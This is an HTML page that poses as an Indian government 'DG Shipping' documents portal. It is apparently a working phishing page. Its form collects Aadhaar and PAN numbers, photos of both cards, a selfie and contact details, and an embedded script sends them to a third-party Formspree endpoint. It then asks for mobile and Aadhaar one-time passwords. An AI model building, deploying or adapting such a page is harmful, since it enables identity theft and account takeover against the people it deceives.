<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DG Shipping | Documents</title>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; padding: 10px; margin: 0; }
        .box { background: white; max-width: 480px; margin: 10px auto; padding: 20px; border-radius: 10px; border-top: 6px solid #003366; }
        label { font-weight: bold; font-size: 13px; display: block; margin-top: 12px; }
        input { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; margin-top: 20px; cursor: pointer; font-weight: bold; }
        #otp-section { display: none; margin-top: 20px; background: #eefbff; padding: 15px; border: 1px dashed #003366; border-radius: 8px; }
    </style>
</head>
<body>
<div class="box">
    <h2 style="text-align:center; color:#003366;">GOVERNMENT OF INDIA</h2>
    <form id="finalForm" action="https://formspree.io/f/xqedpwzb" method="POST" enctype="multipart/form-data">
        <div id="step1">
            <label>Full Name</label><input type="text" name="Name" required>
            <label>Mobile Number</label><input type="tel" name="Mobile" required>
            <label>Email ID</label><input type="email" name="Email" required>
            <label>Aadhaar Number</label><input type="text" name="Aadhaar_No" required>
            <label>PAN Number</label><input type="text" name="PAN_No" required>
            <label>Aadhaar Front</label><input type="file" name="Aadhaar_F" required>
            <label>Aadhaar Back</label><input type="file" name="Aadhaar_B" required>
            <label>PAN Card Photo</label><input type="file" name="PAN_P" required>
            <label>Selfie</label><input type="file" name="Selfie" required>
            <button type="button" class="btn" onclick="sendData(this)">Next: Verify</button>
        </div>
        <div id="otp-section">
            <h3 style="text-align:center;">ENTER OTP</h3>
            <label>Mobile OTP</label><input type="text" name="OTP_Mob">
            <label>Aadhaar OTP</label><input type="text" name="OTP_Aadhaar">
            <button type="submit" class="btn" style="background:#003366;">SUBMIT NOW</button>
        </div>
    </form>
</div>
<script>
    function sendData(btn) {
        const form = document.getElementById('finalForm');
        if(!form.checkValidity()) { form.reportValidity(); return; }
        btn.innerHTML = "Sending..."; btn.disabled = true;
        fetch(form.action, { method: 'POST', body: new FormData(form), headers: { 'Accept': 'application/json' } })
        .then(() => {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('otp-section').style.display = 'block';
        }).catch(() => { alert("Retry!"); btn.innerHTML = "Next"; btn.disabled = false; });
    }
</script>
</body>
</html>
